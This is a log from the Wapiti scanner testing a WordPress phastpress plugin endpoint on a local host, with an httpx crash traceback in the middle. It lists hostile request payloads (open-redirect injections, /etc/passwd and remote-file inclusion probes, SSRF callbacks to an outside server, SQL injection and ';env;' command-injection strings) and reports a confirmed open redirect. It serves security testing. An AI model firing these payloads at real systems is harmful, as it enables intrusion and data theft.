2024-03-21 13:19:25.789 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:25.933 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 13:19:25.933 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_3507d6ba.db
2024-03-21 13:19:25.937 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 13:19:25.967 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 13:19:25.967 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 13:19:26.059 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 13:19:26.072 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 13:19:26.072 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 13:19:26.084 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:26.084 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/phastpress/phast.php?src=https%3A%2F%2Fopenbugbounty.org%2F&service=scripts
2024-03-21 13:19:26.193 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
2024-03-21 13:19:26.193 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/wp-content/plugins/phastpress/phast.php via injection in the query string
2024-03-21 13:19:26.193 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
2024-03-21 13:19:26.193 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /wp-content/plugins/phastpress/phast.php?src=https%3A%2F%2Fopenbugbounty.org%2F&service=scripts HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 13:19:26.193 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
2024-03-21 13:19:26.194 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/phastpress/phast.php?src=%2F%2Fopenbugbounty.org%2F&service=scripts
2024-03-21 13:19:26.295 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
2024-03-21 13:19:26.295 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/wp-content/plugins/phastpress/phast.php via injection in the query string
2024-03-21 13:19:26.295 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
2024-03-21 13:19:26.296 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /wp-content/plugins/phastpress/phast.php?src=%2F%2Fopenbugbounty.org%2F&service=scripts HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 13:19:26.296 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
2024-03-21 13:19:26.296 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-21 13:19:26.318 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=%2F%2Fopenbugbounty.org%2F
2024-03-21 13:19:26.354 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 13:19:26.369 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:26.374 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&service=scripts (0)
2024-03-21 13:19:26.397 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&service=scripts (0)
2024-03-21 13:19:26.420 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%2Fetc%2Fpasswd&service=scripts (0)
2024-03-21 13:19:26.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%2Fetc%2Fpasswd%00&service=scripts (0)
2024-03-21 13:19:26.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%2Fetc%2Fservices&service=scripts (0)
2024-03-21 13:19:26.489 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%2Fetc%2Fservices%00&service=scripts (0)
2024-03-21 13:19:26.512 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&service=scripts (0)
2024-03-21 13:19:26.535 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
Traceback (most recent call last):

  File "/usr/local/bin/wapiti", line 8, in <module>
    sys.exit(wapiti_asyncio_wrapper())
    │   │    └ <function wapiti_asyncio_wrapper at 0x7425c729c900>
    │   └ <built-in function exit>
    └ <module 'sys' (built-in)>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
    asyncio.run(wapiti_main())
    │       │   └ <function wapiti_main at 0x7425c729c860>
    │       └ <function run at 0x7425cbfab560>
    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
    return runner.run(main)
           │      │   └ <coroutine object wapiti_main at 0x7425c74d7240>
           │      └ <function Runner.run at 0x7425cbe36fc0>
           └ <asyncio.runners.Runner object at 0x7425ca00d6d0>
  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
           │    │     └ <function BaseEventLoop.run_until_complete at 0x7425cbe34c20>
           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
           └ <asyncio.runners.Runner object at 0x7425ca00d6d0>
  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
    self.run_forever()
    │    └ <function BaseEventLoop.run_forever at 0x7425cbe34b80>
    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
    self._run_once()
    │    └ <function BaseEventLoop._run_once at 0x7425cbe36980>
    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
    handle._run()
    │      └ <function Handle._run at 0x7425cbf98e00>
    └ <Handle <TaskStepMethWrapper object at 0x7425c6c8a380>()>
  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
    self._context.run(self._callback, *self._args)
    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x7425c6c8a380>()>
    │    │            │    └ <member '_callback' of 'Handle' objects>
    │    │            └ <Handle <TaskStepMethWrapper object at 0x7425c6c8a380>()>
    │    └ <member '_context' of 'Handle' objects>
    └ <Handle <TaskStepMethWrapper object at 0x7425c6c8a380>()>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
    await wap.attack(global_stop_event)
          │   │      └ <asyncio.locks.Event object at 0x7425cbe91a90 [unset]>
          │   └ <function Wapiti.attack at 0x7425c72a6520>
          └ <wapitiCore.controller.wapiti.Wapiti object at 0x7425c7583b90>
> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
    await attack_module.attack(original_request, original_response)
          │             │      │                 └ <wapitiCore.net.response.Response object at 0x7425c6c79d10>
          │             │      └ GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
          │             └ <function ModuleFile.attack at 0x7425c6d98a40>
          └ <wapitiCore.attack.mod_file.ModuleFile object at 0x7425c6de9890>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_file.py", line 166, in attack
    response = await self.crawler.async_send(mutated_request)
                     │    │       │          └ GET http://web/wp-content/plugins/phastpress/phast.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&service=scrip...
                     │    │       └ <function AsyncCrawler.async_send at 0x7425cac96020>
                     │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7425c715b110>
                     └ <wapitiCore.attack.mod_file.ModuleFile object at 0x7425c6de9890>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
    response = await self.async_get(request, headers=headers,
                     │    │         │                └ None
                     │    │         └ GET http://web/wp-content/plugins/phastpress/phast.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&service=scrip...
                     │    └ <function AsyncCrawler.async_get at 0x7425cac96160>
                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7425c715b110>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
    value = await function(*args, **kwargs)
                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x7425c715b110>, GET http://web/wp-content/plugins/phastpress/phast.php?src=C...
                  └ <function AsyncCrawler.async_get at 0x7425cac960c0>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
    response = await self._client.send(
                     │    │       └ <function AsyncClient.send at 0x7425cb1fd1c0>
                     │    └ <httpx.AsyncClient object at 0x7425c756b2d0>
                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7425c715b110>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
    response = await self._send_handling_auth(
                     │    └ <function AsyncClient._send_handling_auth at 0x7425cb1fd260>
                     └ <httpx.AsyncClient object at 0x7425c756b2d0>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
    response = await self._send_handling_redirects(
                     │    └ <function AsyncClient._send_handling_redirects at 0x7425cb1fd300>
                     └ <httpx.AsyncClient object at 0x7425c756b2d0>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
    raise exc
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
    request = self._build_redirect_request(request, response)
              │    │                       │        └ <Response [301 Moved Permanently]>
              │    │                       └ <Request('GET', 'http://web/wp-content/plugins/phastpress/phast.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&...
              │    └ <function BaseClient._build_redirect_request at 0x7425cb1efc40>
              └ <httpx.AsyncClient object at 0x7425c756b2d0>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
    url = self._redirect_url(request, response)
          │    │             │        └ <Response [301 Moved Permanently]>
          │    │             └ <Request('GET', 'http://web/wp-content/plugins/phastpress/phast.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&...
          │    └ <function BaseClient._redirect_url at 0x7425cb1efd80>
          └ <httpx.AsyncClient object at 0x7425c756b2d0>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
    url = url.copy_with(host=request.url.host)
          │   │              │       │   └ <property object at 0x7425cb8ee340>
          │   │              │       └ URL('http://web/wp-content/plugins/phastpress/phast.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&service=scri...
          │   │              └ <Request('GET', 'http://web/wp-content/plugins/phastpress/phast.php?src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&...
          │   └ <function URL.copy_with at 0x7425cb90d8a0>
          └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
    return URL(self, **kwargs)
           │   │       └ {'host': 'web'}
           │   └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
           └ <class 'httpx.URL'>
  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
    self._uri_reference = url._uri_reference.copy_with(**kwargs)
    │                     │   │              │           └ {'host': 'web'}
    │                     │   │              └ <function ParseResult.copy_with at 0x7425cb90c400>
    │                     │   └ ParseResult(scheme='c', userinfo='', host='', port=None, path='%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', query=None,...
    │                     └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
    └ <unprintable URL object>
  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
    return urlparse("", **defaults)
           │              └ {'scheme': 'c', 'authority': '', 'path': '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', 'query': None, 'fragment': None,...
           └ <function urlparse at 0x7425cb90c220>
  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
    │             │                │                         └ True
    │             │                └ True
    │             └ '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices'
    └ <function validate_path at 0x7425cb90ca40>
  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
          └ <class 'httpx.InvalidURL'>

httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
2024-03-21 13:19:26.580 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
2024-03-21 13:19:26.747 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report a427bbde-e785-11ee-a16d-0242ac160004 ... SUCCESS
2024-03-21 13:19:26.753 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-21 13:19:26.770 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:26.771 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F77sqwg%2F1%2F737263%2F&service=scripts (0)
2024-03-21 13:19:26.824 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F77sqwg%2F1%2F73657276696365%2F (0)
2024-03-21 13:19:26.895 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=77sqwg for results, please wait...
2024-03-21 13:19:28.976 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 13:19:28.996 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:29.075 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 13:19:29.091 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:29.092 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%C2%BF%27%22%28&service=scripts (0)
2024-03-21 13:19:29.115 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=fuzz%C2%BF%27%22%28 (0)
2024-03-21 13:19:29.160 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%20AND%2024%3D79%20AND%2047%3D47&service=scripts (0)
2024-03-21 13:19:29.184 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%20AND%2049%3D98%20AND%2072%3D72&service=scripts (0)
2024-03-21 13:19:29.207 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%20AND%2081%3D81%20AND%2072%3D72&service=scripts (0)
2024-03-21 13:19:29.231 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%27%20AND%2012%3D87%20AND%20%2786%27%3D%2786&service=scripts (0)
2024-03-21 13:19:29.254 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%27%20AND%2020%3D59%20AND%20%2719%27%3D%2719&service=scripts (0)
2024-03-21 13:19:29.277 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%27%20AND%2064%3D64%20AND%20%2737%27%3D%2737&service=scripts (0)
2024-03-21 13:19:29.301 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%22%20AND%2086%3D146%20AND%20%2247%22%3D%2247&service=scripts (0)
2024-03-21 13:19:29.327 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%22%20AND%2050%3D96%20AND%20%2237%22%3D%2237&service=scripts (0)
2024-03-21 13:19:29.350 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%22%20AND%2029%3D29%20AND%20%2230%22%3D%2230&service=scripts (0)
2024-03-21 13:19:29.374 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%29%20AND%2032%3D50%20AND%20%2888%3D88&service=scripts (0)
2024-03-21 13:19:29.396 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%29%20AND%2089%3D168%20AND%20%2829%3D29&service=scripts (0)
2024-03-21 13:19:29.420 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%29%20AND%2080%3D80%20AND%20%2881%3D81&service=scripts (0)
2024-03-21 13:19:29.443 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%27%29%20AND%2012%3D22%20AND%20%28%2736%27%3D%2736&service=scripts (0)
2024-03-21 13:19:29.467 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%27%29%20AND%2062%3D72%20AND%20%28%2731%27%3D%2731&service=scripts (0)
2024-03-21 13:19:29.491 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%27%29%20AND%2078%3D78%20AND%20%28%2780%27%3D%2780&service=scripts (0)
2024-03-21 13:19:29.515 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%22%29%20AND%2028%3D51%20AND%20%28%2214%22%3D%2214&service=scripts (0)
2024-03-21 13:19:29.539 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%22%29%20AND%2024%3D78%20AND%20%28%2278%22%3D%2278&service=scripts (0)
2024-03-21 13:19:29.562 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%22%29%20AND%2077%3D77%20AND%20%28%2244%22%3D%2244&service=scripts (0)
2024-03-21 13:19:29.586 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%20AND%2064%3D79%20AND%2031%3D31 (0)
2024-03-21 13:19:29.608 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%20AND%2054%3D77%20AND%2029%3D29 (0)
2024-03-21 13:19:29.630 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%20AND%2042%3D42%20AND%2040%3D40 (0)
2024-03-21 13:19:29.652 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%27%20AND%2080%3D99%20AND%20%2791%27%3D%2791 (0)
2024-03-21 13:19:29.675 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%27%20AND%2065%3D86%20AND%20%2735%27%3D%2735 (0)
2024-03-21 13:19:29.698 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%27%20AND%2019%3D19%20AND%20%2721%27%3D%2721 (0)
2024-03-21 13:19:29.720 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%22%20AND%2019%3D60%20AND%20%2246%22%3D%2246 (0)
2024-03-21 13:19:29.742 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%22%20AND%2040%3D106%20AND%20%2253%22%3D%2253 (0)
2024-03-21 13:19:29.764 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%22%20AND%2015%3D15%20AND%20%2271%22%3D%2271 (0)
2024-03-21 13:19:29.787 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%29%20AND%2019%3D78%20AND%20%2840%3D40 (0)
2024-03-21 13:19:29.809 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%29%20AND%2016%3D87%20AND%20%2869%3D69 (0)
2024-03-21 13:19:29.832 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%29%20AND%2079%3D79%20AND%20%2831%3D31 (0)
2024-03-21 13:19:29.854 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%27%29%20AND%2084%3D143%20AND%20%28%2789%27%3D%2789 (0)
2024-03-21 13:19:29.876 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%27%29%20AND%2047%3D128%20AND%20%28%2734%27%3D%2734 (0)
2024-03-21 13:19:29.898 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%27%29%20AND%2037%3D37%20AND%20%28%2719%27%3D%2719 (0)
2024-03-21 13:19:29.920 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%22%29%20AND%2018%3D117%20AND%20%28%2257%22%3D%2257 (0)
2024-03-21 13:19:29.943 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%22%29%20AND%2022%3D117%20AND%20%28%2247%22%3D%2247 (0)
2024-03-21 13:19:29.965 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts%22%29%20AND%2019%3D19%20AND%20%28%2222%22%3D%2222 (0)
2024-03-21 13:19:30.015 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 13:19:30.036 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:30.054 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 13:19:30.072 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:30.097 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 13:19:30.097 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-21 13:19:30.154 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 13:19:30.155 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-21 13:19:30.233 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 13:19:30.251 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:30.255 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%3Benv%3B&service=scripts (0)
2024-03-21 13:19:30.304 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%7Cenv%7C&service=scripts (0)
2024-03-21 13:19:30.339 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=a%3Benv%3B&service=scripts (0)
2024-03-21 13:19:30.360 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=a%3Benv%3B&service=scripts (0)
2024-03-21 13:19:30.381 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&service=scripts (0)
2024-03-21 13:19:30.403 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%3Benv%3B&service=scripts (0)
2024-03-21 13:19:30.424 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz%0Aenv%3B&service=scripts (0)
2024-03-21 13:19:30.446 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%26set%26&service=scripts (0)
